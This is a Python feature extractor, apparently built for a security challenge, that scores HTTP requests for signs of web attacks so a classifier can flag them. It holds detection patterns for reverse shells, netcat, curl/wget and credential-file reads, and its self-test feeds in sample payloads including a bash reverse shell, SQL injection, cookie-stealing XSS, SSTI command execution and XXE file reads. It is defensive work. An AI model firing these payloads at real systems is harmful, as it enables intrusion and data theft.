#!/usr/bin/env python3
"""
DECEPTICON Comprehensive Feature Extractor
==========================================
Naval SWAVLAMBAN 2025 Challenge 3

100+ features covering ALL modern attack vectors:
- Statistical features (length, entropy, ratios)
- Attack-specific indicators
- Encoding detection
- Structural analysis

Security Reviewed: No eval(), no pickle, safe operations only

Author: DECEPTICON Team
Date: December 2025
"""

import re
import math
import urllib.parse
from typing import Dict, List, Optional, Tuple, Union
from collections import Counter
import string

import numpy as np


class ComprehensiveFeatureExtractor:
    """
    Extract 100 features from HTTP requests for ML classification.
    Covers ALL OWASP Top 10 and modern attack vectors.
    """
    
    # Feature count - MUST match model input
    N_FEATURES = 100
    
    # Pre-compiled patterns for efficiency (compiled once at class level)
    # SQL keywords
    SQL_KEYWORDS = re.compile(
        r'\b(select|insert|update|delete|drop|create|alter|exec|execute|union|'
        r'truncate|declare|cast|convert|char|nchar|varchar|nvarchar|'
        r'table|from|where|and|or|not|null|like|between|in|exists|'
        r'having|group|order|by|limit|offset|join|inner|outer|left|right|'
        r'information_schema|sysobjects|syscolumns|sleep|benchmark|waitfor|'
        r'load_file|into\s+outfile|into\s+dumpfile|xp_cmdshell)\b',
        re.IGNORECASE
    )
    
    # XSS patterns
    XSS_TAGS = re.compile(r'<\s*(script|img|svg|body|iframe|object|embed|form|input|button|style|link|meta|base|applet|frame|frameset|video|audio|source|track|canvas|math|a\s+href)', re.IGNORECASE)
    XSS_EVENTS = re.compile(r'\bon\w+\s*=', re.IGNORECASE)
    XSS_JS_PROTO = re.compile(r'javascript\s*:', re.IGNORECASE)
    
    # RCE patterns
    RCE_SHELL_CMDS = re.compile(r'\b(cat|ls|dir|type|more|head|tail|id|whoami|uname|pwd|ifconfig|ipconfig|wget|curl|nc|netcat|bash|sh|cmd|powershell|python|perl|ruby|php)\b', re.IGNORECASE)
    RCE_SHELL_CHARS = re.compile(r'[;&|`$]|\$\(|\)\s*\{')
    
    # Path traversal
    PATH_TRAVERSAL = re.compile(r'(?:\.\.[\\/]|%2e%2e[\\/]|%252e%252e)', re.IGNORECASE)
    
    # SSRF
    SSRF_LOCALHOST = re.compile(r'(?:localhost|127\.0\.0\.1|0\.0\.0\.0|::1|\[::1\]|169\.254\.169\.254)', re.IGNORECASE)
    SSRF_INTERNAL = re.compile(r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})', re.IGNORECASE)
    
    # XXE
    XXE_ENTITY = re.compile(r'<!(?:DOCTYPE|ENTITY)', re.IGNORECASE)
    XXE_SYSTEM = re.compile(r'SYSTEM\s*["\']', re.IGNORECASE)
    
    # SSTI
    SSTI_JINJA = re.compile(r'\{\{.*?\}\}|\{%.*?%\}')
    SSTI_DUNDER = re.compile(r'__(?:class|mro|subclasses|globals|builtins|import|init|dict|doc)__')
    SSTI_OTHER = re.compile(r'(?:\$\{.*?\}|<%.*?%>|#\{.*?\})')
    
    # NoSQL
    NOSQL_OPERATORS = re.compile(r'\$(?:gt|gte|lt|lte|ne|eq|in|nin|or|and|not|nor|exists|type|regex|where|elem|size|all)', re.IGNORECASE)
    
    # JWT
    JWT_PATTERN = re.compile(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*')
    JWT_ALG_NONE = re.compile(r'["\']?alg["\']?\s*:\s*["\']?none', re.IGNORECASE)
    
    # GraphQL
    GRAPHQL_INTROSPECT = re.compile(r'__schema|__type|__typename', re.IGNORECASE)
    
    # Prototype pollution
    PROTO_POLLUTION = re.compile(r'__proto__|constructor\s*(?:\[|\.)\s*prototype', re.IGNORECASE)
    
    # Deserialization
    JAVA_SERIAL = re.compile(r'rO0AB|aced0005', re.IGNORECASE)
    PHP_SERIAL = re.compile(r'O:\d+:"[^"]+"|a:\d+:\{')
    
    # LDAP
    LDAP_INJECTION = re.compile(r'\*\)\(|\)\(|[&|]\s*\([^)]+=[^)]+\)')
    
    # CRLF
    CRLF_INJECTION = re.compile(r'%0d%0a|%0d|%0a|\\r\\n', re.IGNORECASE)
    
    # Encoding patterns
    URL_ENCODED = re.compile(r'%[0-9a-fA-F]{2}')
    DOUBLE_ENCODED = re.compile(r'%25[0-9a-fA-F]{2}')
    UNICODE_ESCAPE = re.compile(r'\\u[0-9a-fA-F]{4}')
    HTML_ENTITY = re.compile(r'&(?:#\d+|#x[0-9a-fA-F]+|[a-zA-Z]+);')
    HEX_CHARS = re.compile(r'0x[0-9a-fA-F]+')
    BASE64_PATTERN = re.compile(r'[A-Za-z0-9+/]{20,}={0,2}')
    
    # Dangerous file extensions
    DANGEROUS_EXTENSIONS = re.compile(r'\.(php|asp|aspx|jsp|jspx|cgi|pl|py|rb|sh|bash|exe|dll|bat|cmd|ps1|vbs|js|jar|war|ear)\b', re.IGNORECASE)
    
    # Protocol patterns
    PROTOCOLS = re.compile(r'(?:file|gopher|dict|ldap|tftp|ftp|data|php|phar|expect|zip)://', re.IGNORECASE)
    
    def __init__(self):
        """Initialize feature extractor"""
        self.feature_names = self._get_feature_names()
    
    def _get_feature_names(self) -> List[str]:
        """Get ordered list of feature names"""
        return [
            # Basic statistics (0-9)
            'total_length', 'path_length', 'query_length', 'body_length',
            'param_count', 'header_count', 'word_count', 'line_count',
            'max_line_length', 'avg_line_length',
            
            # Character ratios (10-24)
            'uppercase_ratio', 'lowercase_ratio', 'digit_ratio', 'special_char_ratio',
            'whitespace_ratio', 'punctuation_ratio', 'non_ascii_ratio',
            'letter_ratio', 'alphanumeric_ratio', 'hex_char_ratio',
            'bracket_ratio', 'quote_ratio', 'slash_ratio', 'equals_ratio',
            'ampersand_ratio',
            
            # Entropy (25-29)
            'total_entropy', 'path_entropy', 'query_entropy', 'param_value_entropy',
            'char_diversity',
            
            # SQL Injection indicators (30-39)
            'sql_keyword_count', 'sql_comment_count', 'sql_quote_count',
            'sql_union_select', 'sql_or_and', 'sql_time_based', 'sql_error_based',
            'sql_stacked', 'sql_hex_encoding', 'sql_function_count',
            
            # XSS indicators (40-49)
            'xss_tag_count', 'xss_event_count', 'xss_js_protocol', 'xss_svg_count',
            'xss_script_count', 'xss_dom_access', 'xss_alert_count', 'xss_entity_count',
            'xss_template_count', 'xss_data_uri',
            
            # RCE indicators (50-59)
            'rce_shell_cmd_count', 'rce_shell_char_count', 'rce_backtick_count',
            'rce_pipe_count', 'rce_semicolon_count', 'rce_subshell_count',
            'rce_reverse_shell', 'rce_base64_cmd', 'rce_wget_curl', 'rce_nc_count',
            
            # Path traversal (60-64)
            'path_traversal_count', 'path_dot_dot_count', 'path_null_byte',
            'path_encoding_count', 'path_sensitive_file',
            
            # SSRF indicators (65-69)
            'ssrf_localhost_count', 'ssrf_internal_ip', 'ssrf_metadata_aws',
            'ssrf_protocol_count', 'ssrf_dns_rebind',
            
            # XXE indicators (70-74)
            'xxe_entity_count', 'xxe_system_count', 'xxe_external_ref',
            'xxe_parameter_entity', 'xxe_dtd_count',
            
            # SSTI indicators (75-79)
            'ssti_template_count', 'ssti_dunder_count', 'ssti_jinja_count',
            'ssti_erb_count', 'ssti_freemarker',
            
            # NoSQL indicators (80-84)
            'nosql_operator_count', 'nosql_json_depth', 'nosql_where_count',
            'nosql_regex_count', 'nosql_injection_array',
            
            # JWT indicators (85-87)
            'jwt_present', 'jwt_alg_none', 'jwt_kid_injection',
            
            # GraphQL indicators (88-89)
            'graphql_introspect', 'graphql_depth',
            
            # Prototype pollution (90-91)
            'proto_pollution_count', 'constructor_access',
            
            # Deserialization (92-94)
            'java_serial_count', 'php_serial_count', 'python_pickle',
            
            # Other indicators (95-99)
            'ldap_injection_count', 'crlf_injection_count', 'encoding_layers',
            'suspicious_extension', 'overall_risk_score',
        ]
    
    def extract(self, payload: str, path: str = '', query: str = '', 
                headers: Dict[str, str] = None) -> np.ndarray:
        """
        Extract 100 features from input data.
        
        Args:
            payload: The main payload/body content
            path: URL path (optional)
            query: Query string (optional)
            headers: Request headers (optional)
            
        Returns:
            numpy array of 100 features
        """
        if headers is None:
            headers = {}
        
        # Combine all text for analysis
        combined = f"{path} {query} {payload}"
        
        # URL decode for analysis
        try:
            decoded = urllib.parse.unquote(urllib.parse.unquote(combined))
        except:
            decoded = combined
        
        features = np.zeros(self.N_FEATURES, dtype=np.float32)
        
        # Basic statistics (0-9)
        features[0] = len(combined)
        features[1] = len(path)
        features[2] = len(query)
        features[3] = len(payload)
        features[4] = query.count('&') + 1 if query else 0
        features[5] = len(headers)
        features[6] = len(combined.split())
        features[7] = combined.count('\n') + 1
        lines = combined.split('\n')
        features[8] = max(len(l) for l in lines) if lines else 0
        features[9] = np.mean([len(l) for l in lines]) if lines else 0
        
        # Character ratios (10-24)
        total_len = max(len(combined), 1)
        features[10] = sum(1 for c in combined if c.isupper()) / total_len
        features[11] = sum(1 for c in combined if c.islower()) / total_len
        features[12] = sum(1 for c in combined if c.isdigit()) / total_len
        features[13] = sum(1 for c in combined if c in string.punctuation) / total_len
        features[14] = sum(1 for c in combined if c.isspace()) / total_len
        features[15] = sum(1 for c in combined if c in '.,;:!?') / total_len
        features[16] = sum(1 for c in combined if ord(c) > 127) / total_len
        features[17] = sum(1 for c in combined if c.isalpha()) / total_len
        features[18] = sum(1 for c in combined if c.isalnum()) / total_len
        features[19] = sum(1 for c in combined if c in '0123456789abcdefABCDEF') / total_len
        features[20] = sum(1 for c in combined if c in '[]{}()<>') / total_len
        features[21] = sum(1 for c in combined if c in '\'"') / total_len
        features[22] = combined.count('/') / total_len
        features[23] = combined.count('=') / total_len
        features[24] = combined.count('&') / total_len
        
        # Entropy (25-29)
        features[25] = self._calculate_entropy(combined)
        features[26] = self._calculate_entropy(path)
        features[27] = self._calculate_entropy(query)
        if query:
            param_values = [p.split('=')[1] if '=' in p else '' for p in query.split('&')]
            features[28] = np.mean([self._calculate_entropy(v) for v in param_values]) if param_values else 0
        features[29] = len(set(combined)) / max(total_len, 1)
        
        # SQL Injection indicators (30-39)
        features[30] = len(self.SQL_KEYWORDS.findall(decoded))
        features[31] = decoded.count('--') + decoded.count('/*') + decoded.count('#')
        features[32] = decoded.count("'") + decoded.count('"')
        features[33] = 1 if re.search(r'union\s+(?:all\s+)?select', decoded, re.I) else 0
        features[34] = len(re.findall(r"(?:'|\")?\s*(?:or|and)\s+", decoded, re.I))
        features[35] = 1 if re.search(r'(?:sleep|benchmark|waitfor|pg_sleep)\s*\(', decoded, re.I) else 0
        features[36] = 1 if re.search(r'(?:extractvalue|updatexml|exp\s*\()', decoded, re.I) else 0
        features[37] = decoded.count(';')
        features[38] = len(self.HEX_CHARS.findall(decoded))
        features[39] = len(re.findall(r'\b(?:char|chr|concat|substring|ascii|ord)\s*\(', decoded, re.I))
        
        # XSS indicators (40-49)
        features[40] = len(self.XSS_TAGS.findall(decoded))
        features[41] = len(self.XSS_EVENTS.findall(decoded))
        features[42] = len(self.XSS_JS_PROTO.findall(decoded))
        features[43] = decoded.lower().count('<svg')
        features[44] = decoded.lower().count('<script')
        features[45] = len(re.findall(r'(?:document|window)\s*\.', decoded, re.I))
        features[46] = len(re.findall(r'\b(?:alert|confirm|prompt)\s*\(', decoded, re.I))
        features[47] = len(self.HTML_ENTITY.findall(decoded))
        features[48] = len(re.findall(r'\{\{|\$\{|<%', decoded))
        features[49] = 1 if re.search(r'data\s*:\s*text/html', decoded, re.I) else 0
        
        # RCE indicators (50-59)
        features[50] = len(self.RCE_SHELL_CMDS.findall(decoded))
        features[51] = len(self.RCE_SHELL_CHARS.findall(decoded))
        features[52] = decoded.count('`')
        features[53] = decoded.count('|')
        features[54] = decoded.count(';')
        features[55] = decoded.count('$(') + decoded.count('${')
        features[56] = 1 if re.search(r'/dev/tcp/|mkfifo|nc\s+-[el]', decoded, re.I) else 0
        features[57] = 1 if re.search(r'base64\s+-d.*\|\s*(?:bash|sh)', decoded, re.I) else 0
        features[58] = 1 if re.search(r'\b(?:wget|curl)\s+', decoded, re.I) else 0
        features[59] = len(re.findall(r'\b(?:nc|netcat|ncat)\s+', decoded, re.I))
        
        # Path traversal (60-64)
        features[60] = len(self.PATH_TRAVERSAL.findall(combined))
        features[61] = combined.count('../') + combined.count('..\\')
        features[62] = 1 if '%00' in combined or '\x00' in combined else 0
        features[63] = len(self.URL_ENCODED.findall(combined)) + len(self.DOUBLE_ENCODED.findall(combined))
        features[64] = 1 if re.search(r'(?:etc/passwd|etc/shadow|win\.ini|boot\.ini)', decoded, re.I) else 0
        
        # SSRF indicators (65-69)
        features[65] = len(self.SSRF_LOCALHOST.findall(decoded))
        features[66] = len(self.SSRF_INTERNAL.findall(decoded))
        features[67] = 1 if '169.254.169.254' in decoded or 'metadata.google.internal' in decoded else 0
        features[68] = len(self.PROTOCOLS.findall(decoded))
        features[69] = 1 if re.search(r'(?:xip\.io|nip\.io|sslip\.io)', decoded, re.I) else 0
        
        # XXE indicators (70-74)
        features[70] = len(self.XXE_ENTITY.findall(decoded))
        features[71] = len(self.XXE_SYSTEM.findall(decoded))
        features[72] = 1 if re.search(r'SYSTEM\s*["\'](?:file|http|ftp|expect)://', decoded, re.I) else 0
        features[73] = decoded.count('%')
        features[74] = decoded.lower().count('<!doctype')
        
        # SSTI indicators (75-79)
        features[75] = len(self.SSTI_JINJA.findall(decoded)) + len(self.SSTI_OTHER.findall(decoded))
        features[76] = len(self.SSTI_DUNDER.findall(decoded))
        features[77] = decoded.count('{{') + decoded.count('{%')
        features[78] = decoded.count('<%=') + decoded.count('<%')
        features[79] = 1 if '<#' in decoded or '${' in decoded else 0
        
        # NoSQL indicators (80-84)
        features[80] = len(self.NOSQL_OPERATORS.findall(decoded))
        features[81] = self._calculate_json_depth(decoded)
        features[82] = len(re.findall(r'\$where', decoded, re.I))
        features[83] = len(re.findall(r'\$regex', decoded, re.I))
        features[84] = 1 if re.search(r'\[\s*\$', decoded) else 0
        
        # JWT indicators (85-87)
        features[85] = 1 if self.JWT_PATTERN.search(decoded) else 0
        features[86] = 1 if self.JWT_ALG_NONE.search(decoded) else 0
        features[87] = 1 if re.search(r'["\']?kid["\']?\s*:\s*["\']?(?:\.\.|\||;)', decoded, re.I) else 0
        
        # GraphQL indicators (88-89)
        features[88] = len(self.GRAPHQL_INTROSPECT.findall(decoded))
        features[89] = self._calculate_graphql_depth(decoded)
        
        # Prototype pollution (90-91)
        features[90] = len(self.PROTO_POLLUTION.findall(decoded))
        features[91] = 1 if 'constructor' in decoded.lower() and ('prototype' in decoded.lower() or '[' in decoded) else 0
        
        # Deserialization (92-94)
        features[92] = len(self.JAVA_SERIAL.findall(decoded))
        features[93] = len(self.PHP_SERIAL.findall(decoded))
        features[94] = 1 if '__reduce__' in decoded or 'cposix' in decoded else 0
        
        # Other indicators (95-99)
        features[95] = len(self.LDAP_INJECTION.findall(decoded))
        features[96] = len(self.CRLF_INJECTION.findall(combined))
        features[97] = self._calculate_encoding_layers(combined)
        features[98] = 1 if self.DANGEROUS_EXTENSIONS.search(decoded) else 0
        features[99] = self._calculate_risk_score(features)
        
        # Clean up NaN/Inf
        features = np.nan_to_num(features, nan=0.0, posinf=100.0, neginf=0.0)
        
        return features
    
    def _calculate_entropy(self, text: str) -> float:
        """Calculate Shannon entropy"""
        if not text:
            return 0.0
        
        freq = Counter(text)
        total = len(text)
        entropy = 0.0
        
        for count in freq.values():
            if count > 0:
                p = count / total
                entropy -= p * math.log2(p)
        
        return entropy
    
    def _calculate_json_depth(self, text: str) -> int:
        """Calculate JSON nesting depth"""
        max_depth = 0
        current_depth = 0
        
        for char in text:
            if char in '{[':
                current_depth += 1
                max_depth = max(max_depth, current_depth)
            elif char in '}]':
                current_depth = max(0, current_depth - 1)
        
        return max_depth
    
    def _calculate_graphql_depth(self, text: str) -> int:
        """Calculate GraphQL query depth"""
        # Count nested { } pairs
        depth = 0
        max_depth = 0
        
        for char in text:
            if char == '{':
                depth += 1
                max_depth = max(max_depth, depth)
            elif char == '}':
                depth = max(0, depth - 1)
        
        return max_depth
    
    def _calculate_encoding_layers(self, text: str) -> int:
        """Detect encoding layers (URL, double URL, etc.)"""
        layers = 0
        
        # Check for URL encoding
        if self.URL_ENCODED.search(text):
            layers += 1
        
        # Check for double encoding
        if self.DOUBLE_ENCODED.search(text):
            layers += 1
        
        # Check for Unicode escapes
        if self.UNICODE_ESCAPE.search(text):
            layers += 1
        
        # Check for HTML entities
        if self.HTML_ENTITY.search(text):
            layers += 1
        
        # Check for base64
        if self.BASE64_PATTERN.search(text):
            layers += 1
        
        return layers
    
    def _calculate_risk_score(self, features: np.ndarray) -> float:
        """Calculate overall risk score from features"""
        # Weighted sum of high-risk indicators
        weights = {
            33: 3.0,  # UNION SELECT
            35: 3.0,  # Time-based SQLi
            44: 3.0,  # Script tags
            56: 3.0,  # Reverse shell
            72: 3.0,  # XXE external ref
            86: 3.0,  # JWT alg:none
            67: 3.0,  # AWS metadata
        }
        
        risk = 0.0
        for idx, weight in weights.items():
            if idx < len(features):
                risk += features[idx] * weight
        
        # Add moderate indicators
        moderate_indices = [30, 40, 41, 50, 60, 65, 70, 75, 80, 88, 90]
        for idx in moderate_indices:
            if idx < len(features):
                risk += features[idx] * 1.0
        
        return min(risk, 100.0)
    
    def get_feature_names(self) -> List[str]:
        """Get ordered list of feature names"""
        return self.feature_names.copy()
    
    def extract_batch(self, payloads: List[str]) -> np.ndarray:
        """Extract features from multiple payloads"""
        features = []
        for payload in payloads:
            features.append(self.extract(payload))
        return np.array(features, dtype=np.float32)


# Singleton instance for reuse
comprehensive_extractor = ComprehensiveFeatureExtractor()


def extract_features(payload: str, path: str = '', query: str = '',
                     headers: Dict[str, str] = None) -> np.ndarray:
    """Convenience function using singleton extractor"""
    return comprehensive_extractor.extract(payload, path, query, headers)


# ============================================================================
# TESTING
# ============================================================================

if __name__ == '__main__':
    print("DECEPTICON Comprehensive Feature Extractor")
    print("=" * 60)
    
    extractor = ComprehensiveFeatureExtractor()
    print(f"Feature count: {extractor.N_FEATURES}")
    
    # Test payloads
    test_cases = [
        ("Benign", "search?q=hello+world"),
        ("SQLi", "' OR 1=1--"),
        ("SQLi Union", "' UNION SELECT username,password FROM users--"),
        ("XSS", "<script>alert(document.cookie)</script>"),
        ("XSS Event", "<img src=x onerror=alert(1)>"),
        ("RCE", "; cat /etc/passwd"),
        ("RCE Reverse", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
        ("Path Traversal", "../../../../etc/passwd"),
        ("SSRF", "http://169.254.169.254/latest/meta-data/"),
        ("XXE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
        ("SSTI", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
        ("NoSQL", '{"username": {"$ne": null}, "password": {"$ne": null}}'),
        ("JWT None", '{"alg": "none", "typ": "JWT"}'),
        ("GraphQL", '{"query": "{__schema{types{name}}}"}'),
        ("Proto Pollution", '{"__proto__": {"admin": true}}'),
        ("PHP Deser", 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'),
    ]
    
    print("\nTest Results:")
    print("-" * 60)
    
    for name, payload in test_cases:
        features = extractor.extract(payload)
        risk = features[99]  # Overall risk score
        
        # Find which indicators triggered
        indicators = []
        if features[33] > 0: indicators.append("UNION")
        if features[35] > 0: indicators.append("TIME-SQLI")
        if features[44] > 0: indicators.append("SCRIPT")
        if features[41] > 0: indicators.append("EVENT")
        if features[56] > 0: indicators.append("REV-SHELL")
        if features[60] > 0: indicators.append("PATH-TRAV")
        if features[67] > 0: indicators.append("AWS-META")
        if features[70] > 0: indicators.append("XXE")
        if features[76] > 0: indicators.append("DUNDER")
        if features[80] > 0: indicators.append("NOSQL")
        if features[86] > 0: indicators.append("JWT-NONE")
        if features[88] > 0: indicators.append("GRAPHQL")
        if features[90] > 0: indicators.append("PROTO")
        if features[93] > 0: indicators.append("PHP-SER")
        
        print(f"{name:20s} | Risk: {risk:5.1f} | Indicators: {', '.join(indicators) or 'None'}")
    
    print("\n" + "=" * 60)
    print("Feature extractor test complete!")
